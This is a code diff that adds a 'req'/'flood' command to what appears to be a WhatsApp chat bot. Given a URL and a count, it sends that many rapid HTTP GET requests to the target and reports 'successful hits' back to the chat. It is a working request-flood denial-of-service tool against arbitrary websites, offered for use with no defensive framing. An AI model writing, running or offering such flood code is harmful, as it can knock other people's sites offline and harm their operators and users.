@@ -28,6 +28,62 @@ const fkontak = {
     },
 };
 
+
+
+cmd({
+    pattern: "req",
+    react: "💥",
+    alias: ["requestboom", "flood"],
+    desc: "Execute high-volume request bursts without message editing.",
+    category: "owner",
+    use: ".boom <url> <amount>",
+    filename: __filename
+}, async (conn, mek, m, { reply, args }) => {
+    try {
+        const targetUrl = args[0];
+        const requestAmount = parseInt(args[1]);
+
+        if (!targetUrl || isNaN(requestAmount)) {
+            return reply("*⚠️ BOOM Error:* URL and Count required.\nExample: `.boom https://site.com 1000` ");
+        }
+
+        // Informing the start
+        await reply(`*💥 REQUEST BOOM STARTED 💥*\n\n*Target:* ${targetUrl}\n*Total:* ${requestAmount}\n\n_Progress updates will be sent every 500 requests._`);
+
+        let successCount = 0;
+        let errorCount = 0;
+
+        for (let i = 1; i <= requestAmount; i++) {
+            
+            // Fast Asynchronous requests
+            axios.get(targetUrl, { timeout: 3000 })
+                .then(() => { successCount++; })
+                .catch(() => { errorCount++; });
+
+            // Send a NEW message every 500 requests to track progress
+            if (i % 500 === 0) {
+                // Small delay to prevent message flooding
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                
+                await conn.sendMessage(m.chat, { 
+                    text: `*📊 Boom Progress:* ${i} / ${requestAmount}\n✅ Success: ${successCount}\n❌ Failed: ${errorCount}` 
+                });
+            }
+        }
+
+        // Final Report sent as a new message
+        await conn.sendMessage(m.chat, { 
+            text: `*🎯 BOOM COMPLETED 🎯*\n\n*Target:* ${targetUrl}\n*Total Dispatched:* ${requestAmount}\n*Successful Hits:* ${successCount}\n*Failed:* ${errorCount}` 
+        });
+
+    } catch (error) {
+        reply("*❌ Error:* " + error.message);
+    }
+});
+
+
+
+
 cmd({
     pattern: "packages",
     react: "📡",
